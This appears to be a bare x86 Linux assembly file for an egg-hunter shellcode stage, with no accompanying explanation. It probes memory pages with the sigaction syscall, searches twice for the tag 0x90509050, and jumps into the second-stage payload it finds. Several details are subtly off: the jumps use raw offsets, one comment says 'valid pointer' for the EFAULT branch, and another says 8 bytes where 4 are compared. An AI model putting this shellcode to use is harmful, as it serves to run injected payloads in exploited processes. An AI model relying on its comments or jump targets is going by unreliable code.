global _start
section .text
    _start:
        cld                 ; Make sure direction flag isn't set
        or cx, 0xfff
        inc ecx
        push byte 0x43
        pop eax
        int 0x80            ; Sigaction() syscall method
        cmp al, 0xf2        ; EFault?
        jz 0x0              ; jump to 0 if valid pointer
        mov eax, 0x90509050 ; load egg value for comparison
        mov edi, ecx        ; load memory location to compare
        scasd               ; Compare eax with dword @ edi, set status flags
        jnz 0x5             ; If egg candidate not found, go back to 0x5
        scasd               ; Candidate found, compare next 8 bytes
        jnz 0x5             ; If next 8 bytes isn't the same go back to 0x5
        jmp edi             ; Egg found, execute 2nd stage at current offset



